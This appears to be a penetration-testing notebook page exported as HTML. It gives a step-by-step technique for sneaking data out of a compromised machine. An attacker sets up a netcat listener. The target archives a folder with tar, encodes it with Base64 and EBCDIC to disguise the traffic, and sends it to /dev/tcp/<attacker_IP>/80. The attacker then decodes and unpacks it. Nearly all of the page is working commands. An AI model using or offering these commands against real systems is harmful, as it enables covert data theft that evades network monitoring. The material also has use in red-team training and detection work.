<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Exfiltration over TCP Socket with EBCDIC and Base64</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Exfiltration over TCP Socket with EBCDIC and Base64</h1><br/><br />In this example, on our target machine, we will simultaneously “tar” (archive) the data, encode it with <a href="https://en.wikipedia.org/wiki/Base64">Base64</a> and <a href="https://en.wikipedia.org/wiki/EBCDIC">EBCDIC</a> (Extended Binary Coded Decimal Interchange Code) encodings and ship the archive to our attacker system over a TCP socket in order to better obfuscate our traffic.<br /><br />1. On our attacker system, we first configure our netcat listener on port TCP/80 to receive incoming data while redirecting the output to a “datafolder.tmp” file:<br />    <div class="codebox"><pre>attacker@kali<span style="color:#ff9d00;font-weight:700">:/</span># <span style="color:#ff9d00;font-weight:700">mkdir</span> extraction<br />attacker@kali<span style="color:#ff9d00;font-weight:700">:/</span># nc -nlvp 80 &gt; datafolder.tmp</pre></div>   <br /><br />2. On our target system, we tar the datafolder to standard output (stdout) (-), <span style="text-decoration:underline;">encode with both BASE64 and EBCDIC</span>, and redirect the data over a local TCP socket to our attacker machine. In the below example, “datafolder” is the folder containing the data:<br />    <div class="codebox"><pre>target@debian<span style="color:#ff9d00;font-weight:700">:/</span>$ <span style="color:#ff9d00;font-weight:700">mkdir</span> <span style="color:#ff9d00;font-weight:700">/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>datafolder<br />target@debian<span style="color:#ff9d00;font-weight:700">:/</span>$ <span style="color:#ff9d00;font-weight:700">echo</span> provatesto &gt; prova.txt<br />target@debian<span style="color:#ff9d00;font-weight:700">:/</span>$ </pre></div><br />    <div class="codebox"><pre>target@debian<span style="color:#ff9d00;font-weight:700">:/</span>$ <span style="color:#ff9d00;font-weight:700">tar</span> zcf - <span style="color:#ff9d00;font-weight:700">/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>datafolder <span style="color:#ff9d00;font-weight:700">|</span> base64 <span style="color:#ff9d00;font-weight:700">|</span> <span style="color:#ff9d00;font-weight:700">dd</span> conv=ebcdic &gt; <span style="color:#ff9d00;font-weight:700">/</span>dev<span style="color:#ff9d00;font-weight:700">/</span>tcp<span style="color:#ff9d00;font-weight:700">/</span>&lt;attacker_IP&gt;<span style="color:#ff9d00;font-weight:700">/</span>80</pre></div><br />    <a href=""><img src="images/1465-1.png" alt="images/1465-1.png" /></a><br /><br />3. On our attacker machine, we decode the received datafolder.tmp file from EBCDIC back to ASCII, decode the BASE64 and redirect the output to a datafolder.tar file:<br />    <div class="codebox"><pre>attacker@kali<span style="color:#ff9d00;font-weight:700">:/</span># <span style="color:#ff9d00;font-weight:700">dd</span> conv=ascii if=datafolder.tmp <span style="color:#ff9d00;font-weight:700">|</span>base64 -d &gt; datafolder.tar</pre></div><br />    <a href=""><img src="images/1465-2.png" alt="images/1465-2.png" /></a><br />4. Extract our tar archive:<br />    <div class="codebox"><pre>attacker@kali<span style="color:#ff9d00;font-weight:700">:/</span># <span style="color:#ff9d00;font-weight:700">tar</span> xf datafolder.tar<br />attacker@kali<span style="color:#ff9d00;font-weight:700">:/</span># <span style="color:#ff9d00;font-weight:700">ls</span><br />attacker@kali<span style="color:#ff9d00;font-weight:700">:/</span># <span style="color:#ff9d00;font-weight:700">cd</span> datafolder<br />attacker@kali<span style="color:#ff9d00;font-weight:700">:/</span># <span style="color:#ff9d00;font-weight:700">ls</span></pre></div><br />    <a href=""><img src="images/1465-3.png" alt="images/1465-3.png" /></a></div>
</body>
</html>
